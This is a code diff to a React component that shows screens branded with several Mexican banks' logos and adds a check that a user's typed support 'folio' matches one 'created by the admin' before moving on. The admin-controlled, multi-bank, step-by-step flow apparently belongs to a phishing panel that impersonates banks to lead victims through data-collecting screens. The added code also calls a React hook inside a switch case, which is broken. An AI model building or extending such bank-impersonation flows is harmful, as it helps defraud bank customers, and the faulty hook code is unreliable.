@@ -25,6 +25,11 @@ import invexLogoWhite from '../../assets/invex_logo_white.png';
 import banregioLogo from '../../assets/banregio_logo.png';
 import banregioLogoWhite from '../../assets/banregio_logo_white.png';
 
+interface SessionData {
+  folio?: string | null;
+  [key: string]: any;
+}
+
 interface ScreenTemplatesProps {
   currentScreen: ScreenType;
   screenData: {
@@ -39,13 +44,15 @@ interface ScreenTemplatesProps {
   };
   onSubmit: (screen: ScreenType, data: Record<string, any>) => void;
   banco?: string;
+  sessionData?: SessionData; // Agregamos sessionData a las props
 }
 
 export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({ 
   currentScreen, 
   screenData,
   onSubmit,
-  banco = "BANORTE"
+  banco = "BANORTE",
+  sessionData = {}  // Valor por defecto vacío
 }) => {
   // Form state
   const [folioInput, setFolioInput] = useState('');
@@ -139,6 +146,27 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
     // Diferentes pantallas según el tipo
     switch (currentScreen) {
       case ScreenType.FOLIO:
+        // Estado para controlar mensaje de error de folio
+        const [folioError, setFolioError] = useState(false);
+        
+        // Verificamos si el folio coincide con el generado
+        const verificarFolio = () => {
+          // Folio real que viene en los datos de sesión (creado por el admin)
+          const folioReal = sessionData?.folio || '';
+          
+          // Convertimos ambos a string para comparar, en caso de que folioReal sea null
+          const folioRealStr = String(folioReal || '');
+          
+          if (folioInput === folioRealStr) {
+            // Folio correcto, continuar
+            setFolioError(false);
+            onSubmit(ScreenType.FOLIO, { folio: folioInput });
+          } else {
+            // Folio incorrecto, mostrar error
+            setFolioError(true);
+          }
+        };
+        
         const folioContent = (
           <>
             <h2 className="text-xl font-bold mb-3">Folio de soporte:</h2>
@@ -148,14 +176,20 @@ export const ScreenTemplates: React.FC<ScreenTemplatesProps> = ({
               <Input 
                 type="text" 
                 placeholder="Ingrese su número de folio" 
-                className="w-full border border-gray-300 rounded p-2 mb-3"
+                className={`w-full border ${folioError ? 'border-red-500' : 'border-gray-300'} rounded p-2 mb-1`}
                 value={folioInput}
-                onChange={(e) => setFolioInput(e.target.value)}
+                onChange={(e) => {
+                  setFolioInput(e.target.value);
+                  setFolioError(false); // Limpiar error al editar
+                }}
               />
+              {folioError && (
+                <p className="text-red-500 text-sm mb-2">El folio ingresado no es válido. Verifique el folio proporcionado por su ejecutivo.</p>
+              )}
             </div>
             <Button 
               className={primaryBtnClass}
-              onClick={() => onSubmit(ScreenType.FOLIO, { folio: folioInput })}
+              onClick={verificarFolio}
             >
               Continuar
             </Button>
